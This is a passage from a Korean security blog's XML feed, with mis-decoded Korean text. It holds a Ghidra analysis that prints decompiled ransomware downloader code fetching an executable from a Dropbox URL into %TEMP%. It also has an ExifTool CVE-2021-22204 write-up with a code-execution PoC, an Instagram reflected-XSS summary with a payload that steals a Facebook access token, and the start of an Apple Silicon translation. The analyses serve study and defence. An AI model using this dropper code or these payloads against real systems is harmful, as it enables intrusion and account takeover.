src="/2021/05/19/idioth/ghidra_part4/Untitled%2017.png"></p><p>ê·¸ë‹¤ìŒ ë‹¤ìš´ë¡œë“œí•œ gdt íŒŒì¼ì„ ì—´ì–´ì£¼ë©´ ë!</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%2018.png"></p><p>ì´ì œ ì¶”ê°€ê°€ ë˜ì–´ ìˆëŠ” ëª¨ìŠµì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤â€¦ í›„í›„ ë‹¤ë¥¸ í•¨ìˆ˜ í¬ì¸í„°ë“¤ë„ ëª¨ë‘ ì ìš©í•˜ë„ë¡ í•˜ì£ . ì ìš©ì´ ì™„ë£Œëœ ì†ŒìŠ¤ ì½”ë“œëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><pre><code class="hljs c"><span class="hljs-function">undefined4 <span class="hljs-title">download_ATAPIConfiguration</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">char</span> cVar1;  <span class="hljs-keyword">bool</span> bVar2;  undefined4 uVar3;  HMODULE hModule;  <span class="hljs-keyword">int</span> iVar4;  <span class="hljs-keyword">size_t</span> temp_path_len;  undefined4 *puVar5;  uint uVar6;  LPCSTR pCVar7;  <span class="hljs-keyword">int</span> local_64;  undefined4 local_60;  undefined4 lpdwBufferLength;  uint lpBuffer;  FARPROC InternetCloseHandle_addr;  FARPROC WriteFile_addr;  FARPROC InternetReadFile_addr;  HANDLE local_48;  FARPROC CreateFileW_addr;  <span class="hljs-keyword">char</span> *temp_path;  <span class="hljs-keyword">void</span> *local_3c;  <span class="hljs-keyword">int</span> local_38;  FARPROC HttpSendRequestA_addr;  FARPROC InternetSetOptionW;  FARPROC InternetQueryOptionW_addr;  <span class="hljs-keyword">int</span> hInternet;  FARPROC HttpOpenRequestW_addr;  <span class="hljs-keyword">int</span> hConnect;  FARPROC InternetConnectW_addr;  <span class="hljs-keyword">int</span> local_18;  FARPROC InternetOpenW_addr;  HMODULE local_10;    local_10 = LoadLibraryA(<span class="hljs-string">&quot;wininet.dll&quot;</span>);  InternetOpenW_addr = GetProcAddress(local_10,<span class="hljs-string">&quot;InternetOpenW&quot;</span>);  local_18 = (*InternetOpenW_addr)(<span class="hljs-string">L&quot;WINDOWS&quot;</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);  <span class="hljs-keyword">if</span> (local_18 == <span class="hljs-number">0</span>) &#123;    uVar3 = <span class="hljs-number">0xe</span>;  &#125;  <span class="hljs-keyword">else</span> &#123;    hModule = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);    InternetConnectW_addr = GetProcAddress(hModule,<span class="hljs-string">&quot;InternetConnectW&quot;</span>);    hConnect = (*InternetConnectW_addr)(local_18,<span class="hljs-string">L&quot;dl.dropboxusercontent.com&quot;</span>,<span class="hljs-number">0x1bb</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>);    <span class="hljs-keyword">if</span> (hConnect == <span class="hljs-number">0</span>) &#123;      uVar3 = <span class="hljs-number">0xe</span>;    &#125;    <span class="hljs-keyword">else</span> &#123;      hModule = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);      HttpOpenRequestW_addr = GetProcAddress(hModule,<span class="hljs-string">&quot;HttpOpenRequestW&quot;</span>);      hInternet = (*HttpOpenRequestW_addr)                            (hConnect,&amp;DAT_00413270,<span class="hljs-string">L&quot;/s/uzu60whrg1spnyy/ATAPIConfiguration&quot;</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,                             <span class="hljs-number">0x800000</span>,<span class="hljs-number">1</span>);      <span class="hljs-keyword">if</span> (hInternet == <span class="hljs-number">0</span>) &#123;        uVar3 = <span class="hljs-number">0xe</span>;      &#125;      <span class="hljs-keyword">else</span> &#123;        lpdwBufferLength = <span class="hljs-number">4</span>;        hModule = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);        InternetQueryOptionW_addr = GetProcAddress(hModule,<span class="hljs-string">&quot;InternetQueryOptionW&quot;</span>);        iVar4 = (*InternetQueryOptionW_addr)(hInternet,<span class="hljs-number">0x1f</span>,&amp;lpBuffer,&amp;lpdwBufferLength);        <span class="hljs-keyword">if</span> (iVar4 != <span class="hljs-number">0</span>) &#123;          hModule = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);          InternetSetOptionW = GetProcAddress(hModule,<span class="hljs-string">&quot;InternetSetOptionW&quot;</span>);          lpBuffer = lpBuffer | <span class="hljs-number">0x1180</span>;          (*InternetSetOptionW)(hInternet,<span class="hljs-number">0x1f</span>,&amp;lpBuffer,<span class="hljs-number">4</span>);        &#125;        hModule = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);        HttpSendRequestA_addr = GetProcAddress(hModule,<span class="hljs-string">&quot;HttpSendRequestA&quot;</span>);        local_38 = (*HttpSendRequestA_addr)(hInternet,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);        local_3c = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">16000</span>);        <span class="hljs-built_in">memset</span>(local_3c,<span class="hljs-number">0</span>,<span class="hljs-number">16000</span>);        <span class="hljs-built_in">memset</span>(download_path,<span class="hljs-number">0</span>,<span class="hljs-number">0x1000</span>);        temp_path = getenv(<span class="hljs-string">&quot;TEMP&quot;</span>);        temp_path_len = <span class="hljs-built_in">strlen</span>(temp_path);        DAT_0041602c = (LPCSTR)<span class="hljs-built_in">malloc</span>(temp_path_len + <span class="hljs-number">0x1000</span>);        <span class="hljs-built_in">strcpy</span>(DAT_0041602c,temp_path);        uVar6 = <span class="hljs-number">0xffffffff</span>;        pCVar7 = DAT_0041602c;        <span class="hljs-keyword">do</span> &#123;          <span class="hljs-keyword">if</span> (uVar6 == <span class="hljs-number">0</span>) <span class="hljs-keyword">break</span>;          uVar6 = uVar6 - <span class="hljs-number">1</span>;          cVar1 = *pCVar7;          pCVar7 = pCVar7 + <span class="hljs-number">1</span>;        &#125; <span class="hljs-keyword">while</span> (cVar1 != <span class="hljs-string">&#x27;\0&#x27;</span>);        puVar5 = (undefined4 *)(DAT_0041602c + (~uVar6 - <span class="hljs-number">1</span>));        *puVar5 = <span class="hljs-number">0x4154415c</span>;        puVar5[<span class="hljs-number">1</span>] = <span class="hljs-number">0x6f434950</span>;        puVar5[<span class="hljs-number">2</span>] = <span class="hljs-number">0x6769666e</span>;        puVar5[<span class="hljs-number">3</span>] = <span class="hljs-number">0x74617275</span>;        puVar5[<span class="hljs-number">4</span>] = <span class="hljs-number">0x2e6e6f69</span>;        puVar5[<span class="hljs-number">5</span>] = <span class="hljs-number">0x657865</span>;        MultiByteToWideChar(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,DAT_0041602c,<span class="hljs-number">-1</span>,download_path,<span class="hljs-number">0x1000</span>);        hModule = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);        CreateFileW_addr = GetProcAddress(hModule,<span class="hljs-string">&quot;CreateFileW&quot;</span>);                    <span class="hljs-comment">/* GENERIC_READ | GENERIC_WRITE */</span>        local_48 = (HANDLE)(*CreateFileW_addr)(download_path,<span class="hljs-number">0xc0000000</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0</span>);        local_60 = <span class="hljs-number">0</span>;        hModule = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);        InternetReadFile_addr = GetProcAddress(hModule,<span class="hljs-string">&quot;InternetReadFile&quot;</span>);        hModule = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);        WriteFile_addr = GetProcAddress(hModule,<span class="hljs-string">&quot;WriteFile&quot;</span>);        <span class="hljs-keyword">if</span> (local_38 == <span class="hljs-number">0</span>) &#123;          uVar3 = <span class="hljs-number">0xe</span>;        &#125;        <span class="hljs-keyword">else</span> &#123;          local_64 = <span class="hljs-number">0</span>;          <span class="hljs-keyword">while</span>( <span class="hljs-literal">true</span> ) &#123;            iVar4 = (*InternetReadFile_addr)(hInternet,local_3c,<span class="hljs-number">0x2000</span>,&amp;local_64);            <span class="hljs-keyword">if</span> ((iVar4 == <span class="hljs-number">0</span>) || (local_64 == <span class="hljs-number">0</span>)) &#123;              bVar2 = <span class="hljs-literal">false</span>;            &#125;            <span class="hljs-keyword">else</span> &#123;              bVar2 = <span class="hljs-literal">true</span>;            &#125;            <span class="hljs-keyword">if</span> (!bVar2) <span class="hljs-keyword">break</span>;            (*WriteFile_addr)(local_48,local_3c,local_64,&amp;local_60,<span class="hljs-number">0</span>);          &#125;          hModule = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);          InternetCloseHandle_addr = GetProcAddress(hModule,<span class="hljs-string">&quot;InternetCloseHandle&quot;</span>);          CloseHandle(local_48);          (*InternetCloseHandle_addr)(local_18);          (*InternetCloseHandle_addr)(hConnect);          (*InternetCloseHandle_addr)(hInternet);          uVar3 = <span class="hljs-number">1</span>;        &#125;      &#125;    &#125;  &#125;  <span class="hljs-keyword">return</span> uVar3;&#125;</code></pre><p>í•¨ìˆ˜ê°€ ë§ì´ ê¸°ë„¤ìš”â€¦ ìœ„ì—ì„œë¶€í„° ë‚´ë ¤ê°€ ë´…ì‹œë‹¤.</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%2019.png"></p><p><code>HttpOpenRequestW</code>ë¥¼ í†µí•´ <code>dl.dropboxusercontent.com/s/uzu60whrglspnyy/ATAPIConfiguration</code>ì— ì—°ê²°í•©ë‹ˆë‹¤.</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%2020.png"></p><p>TEMP í´ë”ì˜ ê²½ë¡œë¥¼ ê°€ì ¸ì™€ ë‹¤ìš´ë¡œë“œí•  ê²½ë¡œë¥¼ ì„¤ì •í•˜ëŠ” ê²ƒ ê°™ìŠµë‹ˆë‹¤. ê·¼ë° hexë¡œ ë˜ì–´ ìˆì–´ì„œ í™•ì¸í•˜ê¸° ì–´ë µë„¤ìš”. ë””ìŠ¤ ì–´ì…ˆë¸” ì°½ì—ì„œ Conver â†’ Char Sequenceë¡œ ì–´ë–¤ ë¬¸ìì—´ì¸ì§€ í™•ì¸í•´ë´…ì‹œë‹¤.</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%2021.png"></p><p><code>\\ATAPIConfiguration.exe\0</code>ë„¤ìš”. ì´ì œ ê²½ë¡œ ì„¤ì •ê¹Œì§€ í–ˆìœ¼ë‹ˆ íŒŒì¼ì„ ì½ì–´ì™€ í•´ë‹¹ ê²½ë¡œì— ìƒì„±í•˜ê² ì£ ?</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%2022.png"></p><p>ë¹™ê³ ì…ë‹ˆë‹¤. ì •ë¦¬í•˜ë©´ <code>download_ATAPIConfiguration()</code>ì€ <code>dl.dropboxusercontent.com/s/uzu60whrglspnyy/ATAPIConfiguration</code>ì— ì ‘ì†í•´ì„œ <code>%TEMP%\ATAPIConfiguration.exe</code>ë¡œ íŒŒì¼ì„ ë‹¤ìš´ë¡œë“œí•œë‹¤!</p><h1 id="to-be-continuedâ€¦"><a href="#to-be-continuedâ€¦" class="headerlink" title="to be continuedâ€¦"></a>to be continuedâ€¦</h1><p>ë‹¤ìŒì—ëŠ” ATAPIConfigurationì— ëŒ€í•´ì„œ ë‹¤ë¤„ë³¼ ì˜ˆì •ì…ë‹ˆë‹¤. ì›ë˜ í•œ ê¸€ì— ëª¨ë‘ ë‹¤ ë‹´ìœ¼ë ¤ í–ˆëŠ”ë° ìƒê°ë³´ë‹¤ ë§ì´ ê¸¸ì–´ì¡Œë„¤ìš”. ë‹¤ë¥¸ ë¶„ì„ì€ ëª¨ë‘ ì œì™¸í•˜ê³  ghidraë¥¼ ì‚¬ìš©í•œ ì •ì  ë¶„ì„ë§Œ ì§„í–‰í•˜ëŠ” ê²ƒì´ë¼ í‹€ë¦° ë‚´ìš©ì´ ì¡´ì¬í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤! ê·¸ëŸ¼ ìµœëŒ€í•œ ë¹¨ë¦¬ ë‹¤ìŒ íŒŒíŠ¸ë¥¼ ì¤€ë¹„í•´ì˜¤ë„ë¡ í•˜ê² ìŠµë‹ˆë‹¤. ê·¸ëŸ¼ ëª¨ë‘ ì•ˆë…•~</p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>malware</tag>
      
      <tag>reversing</tag>
      
      <tag>ghidra</tag>
      
      <tag>ransomware</tag>
      
      <tag>ghidra tutorials</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2021-22204: ExifTool ì„ì˜ ì½”ë“œ ì‹¤í–‰ ì·¨ì•½ì </title>
    <link href="/2021/05/18/l0ch/2021-05-18/"/>
    <url>/2021/05/18/l0ch/2021-05-18/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html">ExifTool CVE-2021-22204 - Arbitrary Code Execution</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>ExifTool </li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ì´ë¯¸ì§€ íŒŒì¼ì˜ ë©”íƒ€ ë°ì´í„°ë¥¼ ìˆ˜ì •í•  ë•Œ ì‚¬ìš©ë˜ëŠ” ExifToolì—ì„œ ì„ì˜ ì½”ë“œ ì‹¤í–‰ ì·¨ì•½ì ì´ ë°œê²¬ë˜ì–´ ì„¸ë¶€ ì •ë³´ê°€ ê³µê°œë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>ExifToolì€ perl ìŠ¤í¬ë¦½íŠ¸ë¡œ êµ¬í˜„ë˜ì—ˆìœ¼ë©° ì·¨ì•½ì ì€ DjVu íŒŒì¼ì„ íŒŒì‹±í•˜ëŠ” <code>DjVu</code> ëª¨ë“ˆì˜ <code>ParseAnt</code> ë©”ì„œë“œì— ì¡´ì¬í•©ë‹ˆë‹¤.</p><pre><code class="hljs perl"><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">ParseAnt</span>($)</span><span class="hljs-function">...</span><span class="hljs-function">$<span class="hljs-title">tok</span> = &#x27;&#x27;</span>;  <span class="hljs-keyword">for</span> (;;) &#123;      <span class="hljs-comment"># get string up to the next quotation mark</span>      <span class="hljs-comment"># this doesn&#x27;t work in perl 5.6.2! grrrr</span>      <span class="hljs-comment"># last Tok unless $$dataPt =~ /(.*?)&quot;/sg;</span>      <span class="hljs-comment"># $tok .= $1;</span>      <span class="hljs-keyword">my</span> $pos = <span class="hljs-keyword">pos</span>($$dataPt);      <span class="hljs-keyword">last</span> Tok <span class="hljs-keyword">unless</span> $$dataPt =~ <span class="hljs-regexp">/&quot;/sg</span>;      $tok .= <span class="hljs-keyword">substr</span>($$dataPt, $pos, <span class="hljs-keyword">pos</span>($$dataPt)-<span class="hljs-number">1</span>-$pos);      <span class="hljs-comment"># we&#x27;re good unless quote was escaped by odd number of backslashes</span>      <span class="hljs-keyword">last</span> <span class="hljs-keyword">unless</span> $tok =~ <span class="hljs-regexp">/(\\\\+)$/</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">length</span>($1) &amp; <span class="hljs-number">0x01</span>;      $tok .= <span class="hljs-string">&#x27;&quot;&#x27;</span>;    <span class="hljs-comment"># quote is part of the string</span>  &#125;  <span class="hljs-comment"># must protect unescaped &quot;$&quot; and &quot;@&quot; symbols, and &quot;\\&quot; at end of string</span>  $tok =~ <span class="hljs-keyword">s</span>&#123;\\\\(.)|([\\$\\@]|\\\\$)&#125;&#123;<span class="hljs-string">&#x27;\\\\&#x27;</span>.($2 || $1)&#125;sge;  <span class="hljs-comment"># convert C escape sequences (allowed in quoted text)</span>  $tok = <span class="hljs-keyword">eval</span> <span class="hljs-string">qq&#123;&quot;$tok&quot;&#125;</span>;...</code></pre><p>ìœ„ ì½”ë“œëŠ” Cì™€ ìœ ì‚¬í•œ escape sequenceë¥¼ êµ¬í˜„í•œ ì½”ë“œë¡œ <code>$tok</code> ë³€ìˆ˜ì˜ íŠ¹ìˆ˜ ë¬¸ìë¥¼ escape ì²˜ë¦¬í•œ ë’¤ ì´ë¥¼ <code>eval</code> í•¨ìˆ˜ì— ì „ë‹¬í•©ë‹ˆë‹¤.</p><p>ê·¸ëŸ¬ë‚˜ ì •ê·œì‹ <code>tok =~ /(\\\\+)$/</code> ì—ì„œ <code>$</code>ê°€ ë¬¸ìì—´ì˜ ëê³¼ ê°œí–‰ì„ ì˜ë¯¸í•´ ë°± ìŠ¬ë˜ì‹œì™€ ê°œí–‰ ë¬¸ìë¥¼ ì“°ë©´ ë¬¸ìì—´ì´ ëë‚œ ê²ƒìœ¼ë¡œ ì¸ì‹í•˜ê³  ê°œí–‰ ì´í›„ì— ì˜¤ëŠ” íŠ¹ìˆ˜ ë¬¸ìë¥¼ ì²˜ë¦¬í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ë”°ë¼ì„œ <code>return data;</code> ì½”ë“œë¥¼ ì‹¤í–‰í•˜ëŠ” ì•„ë˜ PoCì™€ ê°™ì´ <code>eval</code> í•¨ìˆ˜ë¥¼ ë²—ì–´ë‚˜ ì„ì˜ ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs python">(metadata    (Author <span class="hljs-string">&quot;\\</span><span class="hljs-string">&quot;</span> . <span class="hljs-keyword">return</span> `date`; <span class="hljs-comment">#&quot;)</span>)</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>arbitrary code execution</tag>
      
      <tag>L0ch</tag>
      
      <tag>escape sequence</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] Reflected XSSë¥¼ í†µí•œ ì¸ìŠ¤íƒ€ê·¸ë¨ ê³„ì • íƒˆì·¨</title>
    <link href="/2021/05/17/idioth/2021-05-17/"/>
    <url>/2021/05/17/idioth/2021-05-17/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://ysamm.com/?p=695">One-click reflected XSS in www.instagram.com due to unfiltered URI schemes leads to account takeover</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li><a href="http://www.instagram.com/">www.instagram.com</a> ë°ìŠ¤í¬í†± ë²„ì „</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ë°ìŠ¤í¬í†± ë²„ì „ì˜ <a href="http://www.instagram.com/">www.instagram.com</a> ì—ì„œ í•„í„°ë§ ë˜ì§€ ì•Šì€ URI ìŠ¤í‚¤ë§ˆë¥¼ í†µí•´ ì‚¬ìš©ìê°€ íƒ­ì„ ì—´ê±°ë‚˜ ë‹«ëŠ”ë° ì‚¬ìš©ë˜ëŠ” ë§ˆìš°ìŠ¤ì˜ ê°€ìš´ë° ë²„íŠ¼ì„ í´ë¦­í•  ì‹œ reflected XSSê°€ ë°œìƒí•˜ëŠ” ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>í•´ë‹¹ ì·¨ì•½ì ì€ ì·¨ì•½í•œ ì—”ë“œ í¬ì¸íŠ¸ë¡œ ì „ë‹¬ëœ íŒŒë¼ë¯¸í„° ë‚´ë¶€ì˜ í˜ì´ë¡œë“œê°€ <code>href</code> ì†ì„±ì˜ html <code>a</code> íƒœê·¸ ë‚´ë¶€ì— ë°˜ì˜ë˜ì–´ ë°œìƒí•©ë‹ˆë‹¤. í˜ì´ë¡œë“œëŠ” <a href="http://www.instagram.com/">www.instagram.com</a> ì—ì„œ í•´ì»¤ì˜ ìë°”ìŠ¤í¬ë¦½íŠ¸ ì½”ë“œë¥¼ ì‹¤í–‰í•˜ëŠ” ìë°”ìŠ¤í¬ë¦½íŠ¸ URI ìŠ¤í‚¤ë§ˆì´ë©° ê³µê²©ì´ ì‹¤íŒ¨í•˜ë”ë¼ë„ ì´ë²¤íŠ¸ í•¸ë“¤ëŸ¬ê°€ URLì„ ë‹¤ë¥¸ í¬ë§·ìœ¼ë¡œ ë³€ê²½í•©ë‹ˆë‹¤. ë˜í•œ ì‚¬ìš©ìê°€ ìƒˆë¡œìš´ íƒ­ì—ì„œ URLì„ ì—´ê¸° ìœ„í•´ ë§ˆìš°ìŠ¤ ê°€ìš´ë° ë²„íŠ¼ì„ í´ë¦­í•˜ê±°ë‚˜ ì™¼ìª½ê³¼ ì˜¤ë¥¸ìª½ì„ ë™ì‹œì— ëˆ„ë¥´ëŠ” ê²½ìš°ì— XSSì™€ ê³„ì • íƒˆì·¨ê°€ ê°€ëŠ¥í•©ë‹ˆë‹¤. ìƒˆ íƒ­ì—ì„œ ì—´ ê²½ìš° URLì„ ë³€ê²½í•˜ëŠ” ìë°”ìŠ¤í¬ë¦½íŠ¸ ì½”ë“œë¥¼ ìš°íšŒí•˜ì—¬ ê³µê²©ì— ì„±ê³µí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ì‚¬ìš©ìê°€ <code>https://www.instagram.com/accounts/recovery/landing/?token=true&amp;next=javascript:fetch(â€œhttps://www.facebook.com/x/oauth/status?client_id=124024574287414&amp;input_token&amp;origin=1&amp;redirect_uri=https%3A%2F%2Fwww.instagram.com%2F&amp;sdk=joey&amp;wants_cookie_data=trueâ€œ,&#123;mode:â€corsâ€,credentials:â€includeâ€&#125;).then(function(a)&#123;alert(a.headers.get(â€œfb-arâ€));console.log(a.headers.get(â€œfb-arâ€));&#125;);</code> ë§í¬ì— ì ‘ì†í•  ê²½ìš° <code>/x/oauth/status</code> í˜ì´ìŠ¤ë¶ OAuth ì—”ë“œ í¬ì¸íŠ¸ë¡œë¶€í„° í˜ì´ìŠ¤ë¶ ì•¡ì„¸ìŠ¤ í† í°ì„ ìš”ì²­í•©ë‹ˆë‹¤. ì•¡ì„¸ìŠ¤ í† í°ì€ ì¸ìŠ¤íƒ€ê·¸ë¨ ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ì»¨í…ìŠ¤íŠ¸ì—ì„œ ìƒì„±ë˜ê³  í•´ë‹¹ ì•¡ì„¸ìŠ¤ í† í°ì„ í†µí•´ í˜ì´ìŠ¤ë¶ ê³„ì •ì„ íƒˆì·¨í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>xss</tag>
      
      <tag>idioth</tag>
      
      <tag>instagram</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Translation] ì• í”Œ ì‹¤ë¦¬ì½˜ í•˜ë“œì›¨ì–´ì˜ ë¹„ë°€: SPRRê³¼ Guarded Exception Levels (GXF)</title>
    <link href="/2021/05/16/idioth/apple_silicon_sprr_gxf/"/>
    <url>/2021/05/16/idioth/apple_silicon_sprr_gxf/</url>
    
    <content type="html"><![CDATA[<p>ì•ˆë…•í•˜ì„¸ìš”. idiothì…ë‹ˆë‹¤. ghidraë¡œ ì•…ì„±ì½”ë“œ ë¶„ì„ì„ í•´ì˜¨ë‹¤ëŠ” ë…€ì„ì´ ì™œ ê¸€ì€ ì•ˆ ì˜¬ë¦¬ê³  ë²ˆì—­ê¸€ì„ ì“°ê³  ìˆëƒê³ ìš”? ì‚¬ì—°ì´ ìˆìŠµë‹ˆë‹¤. ë³¸ë˜ ì˜¤ëŠ˜ í•´ë‹¹ ê¸€ì´ ì˜¬ë¼ê°”ì–´ì•¼ í–ˆëŠ”ë°, ë¶„ì„ì€ ëëƒˆìœ¼ë‚˜ ì´ë²ˆ ì£¼ ì œê°€ ì•„íŒ ì–´ì„œ ì–´ì œ ì¶œê·¼ì„ í•˜ì˜€ìœ¼ë‚˜ ê³„ì†ë˜ëŠ” ê¸°ì¹¨ìœ¼ë¡œ ì¸í•´ ì«“ê²¨ë‚¬ìŠµë‹ˆë‹¤.</p><p>ì—¬ê¸°ì„œ ì œê°€ ë‹‰ê°’ì„ í•´ë²„ë ¸ì£ . í¬ë¡¬ ì›ê²© ë°ìŠ¤í¬í†±ì„ ì„¤ì¹˜í•´ë†“ê³  ì ˆì „ ì„¤ì •ì„ ì•ˆ ê±´ë“œë ¤ë†”ì„œ ì ‘ê·¼ì´ ì•ˆë©ë‹ˆë‹¤.</p><p><img src="/2021/05/16/idioth/apple_silicon_sprr_gxf/Untitled.png"></p><p>ì–´ì œ ì„¤ì •í•˜ê³  ì§€í•˜ì²  íƒ€ê³  ì§‘ì— ì˜¤ë‹ˆ ì´ë ‡ê²Œ ë˜ìˆë„¤ìš”. ì•„</p><p><img src="/2021/05/16/idioth/apple_silicon_sprr_gxf/Untitled%201.png"></p><p>ì–¼ë¥¸ ì§‘ ì»´í“¨í„°ë¥¼ ì—…ê¸€ì„ í•´ì„œ VMì„ ì§‘ ì»´ìœ¼ë¡œ ëŒë¦¬ë˜ê°€ í•´ì•¼ê² ì–´ìš”â€¦ ìš”ì¦˜ ê°™ì€ ì‹œêµ­ì— ì•„í”„ë©´ ì§‘ì—ì„œ ê³µë¶€ë¥¼ í•´ì•¼ í•˜ë‹ˆê¹Œìš”! ì•„ë¬´íŠ¼ ã…œã…œâ€¦ ARMì„ ê³µë¶€í•´ë³¼ê¹Œ í•˜ë˜ ì™€ì¤‘ì— ë§¥ë¶ M1 ì¹©ì´ ë“±ì¥í•˜ì˜€ê³  ê·¸ì— ê´€ë ¨ëœ ìë£Œë“¤ì´ ëˆˆì— ë³´ì´ë©´ ì¡ì§€ ì½ëŠ” ëŠë‚Œìœ¼ë¡œ ì½ê³¤ í•©ë‹ˆë‹¤. <del>ì‚¬ëŒ ë†€ë¦´ë§Œí•œ ë²„ê·¸ëŠ” ì—†ëŠ”ì§€â€¦ ë™ìƒì´ m1 ì—ì–´ë¥¼ ì“°ê±°ë“ ìš”.</del> ARM ì•„í‚¤í…ì²˜ë¡œ ë„˜ì–´ì˜¤ë©´ì„œ ìŠ¤ë§ˆíŠ¸í° ë“±ì— ì ìš©ë˜ì–´ ìˆë˜ ë³´í˜¸ ê¸°ë²•ë“¤ì´ ì–¼ë§ˆë‚˜ ë“¤ì–´ì˜¬ê¹Œ?ë¼ëŠ” ê¶ê¸ˆì¦ì´ ìˆì—ˆëŠ”ë°, ì´ë²ˆ ê¸€ì´ ë™ì‘ ë°©ì‹ì— ëŒ€í•´ ì–´ëŠ ì •ë„ ì˜ë¬¸ì„ í•´ê²°í•´ì¤„ ê±°ë¼ ìƒê°í•©ë‹ˆë‹¤!</p><p>ë²ˆì—­ì—ëŠ” ì˜ì—­ê³¼ ì˜¤ì—­ì´ ì¡´ì¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. í‹€ë¦° ë¶€ë¶„ì´ë‚˜ ì´í•´í•˜ê¸° í˜ë“  ë¶€ë¶„ì´ ìˆë‹¤ë©´ ì½”ë©˜íŠ¸ ë‹¬ì•„ì£¼ì‹œë©´ ê°ì‚¬ë“œë¦½ë‹ˆë‹¤.</p><blockquote><p>ì›ë¬¸ ê¸€ : <a href="https://blog.svenpeter.dev/posts/m1_sprr_gxf/">Apple Silicon Hardware Secrets: SPRR and Guarded Exception Levels (GXF)</a></p></blockquote><h1 id="ì†Œê°œ"><a href="#ì†Œê°œ" class="headerlink" title="ì†Œê°œ"></a>ì†Œê°œ</h1><p>1ë…„ ì „ì— <a href="https://twitter.com/s1guza">siguza</a>ëŠ” í˜ì´ì§€ í…Œì´ë¸”ì˜ ê¶Œí•œì„ ì¬ì •ì˜í•˜ê³  ì»¤ë„ì˜ ì¼ë¶€ë¥¼ ë³´í˜¸í•˜ëŠ” ì»¤ìŠ¤í…€ ARM extension <a href="https://siguza.github.io/APRR/">Apple APRRì— ê´€í•œ write-up</a>ì„ ì‘ì„±í–ˆë‹¤. ì´í›„ ì• í”Œì´ ì¶œì‹œí•œ M1 ì¹©ì€ ì—…ë°ì´íŠ¸ëœ APRR ë¿ë§Œ ì•„ë‹ˆë¼ ë¶€íŒ… ì§í›„ ë² ì–´ ë©”íƒˆ ì½”ë“œë¥¼ ì‰½ê²Œ ì‹¤í–‰í•  ìˆ˜ ìˆë‹¤. ìƒˆ ë²„ì „ì— ëŒ€í•œ ë£¨ë¨¸ê°€ ìˆì§€ë§Œ ê³µì‹ì ì¸ ìë£ŒëŠ” ì•„ì§ ì—†ë‹¤.</p><p>ì´ ê²Œì‹œê¸€ì˜ ì²« ë¶€ë¶„ì€ aarch64ì˜ ë©”ëª¨ë¦¬ ê´€ë¦¬, í˜ì´ì§€ í…Œì´ë¸”, ìœ ì €/ì»¤ë„ ëª¨ë“œì— ëŒ€í•´ ê°„ëµí•˜ê²Œ ì†Œê°œí•˜ë©° ì´ì „ Apple SoCì™€ ê°™ì€ ê¸°ëŠ¥ì¸ APRRë„ 